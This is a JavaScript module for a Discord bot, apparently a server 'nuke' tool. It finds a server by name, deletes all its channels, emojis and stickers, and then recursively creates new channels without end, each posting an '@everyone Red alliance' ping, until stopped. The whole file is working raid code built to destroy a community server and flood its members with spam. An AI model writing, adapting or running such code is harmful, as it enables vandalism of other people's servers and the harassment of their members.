var stop = false
module.exports ={
    start: function (message, bot, args){
        //find the guild
        const guild = bot.guilds.cache.find(guild => guild.name.includes(args[1]))
        //if guild exists
        if(guild == null) return message.channel.send("Error 3360 : The server dosen't exist")
        //if args 3
        if(args[2] == undefined) return message.channel.send("Error 3990 : Presice in wich channel")
        //deleting channels
        guild.channels.cache.forEach(channel => {
            channel.delete()
        })
        //deleting emojis
        guild.emojis.cache.forEach(emoji => {
            emoji.delete()
        })
        //deleting stickers
        guild.stickers.cache.forEach(stick => {
            stick.delete()
        })

        nuke()
        function nuke() {
            //if stopped
            if(stop) return stop = false & message.author.send('stopped')
            //new text channel
            guild.channels.create(args[2].replace(' ', '-'), {
                type: "GUILD_TEXT"
            }).then(channel => {
                //everyone
                channel.send('@everyone Red alliance ;) ;) ;)',{
                    
                })
                //again
                nuke()
            })
        }
    },
    stop: function(){
        stop = true
    }
}
    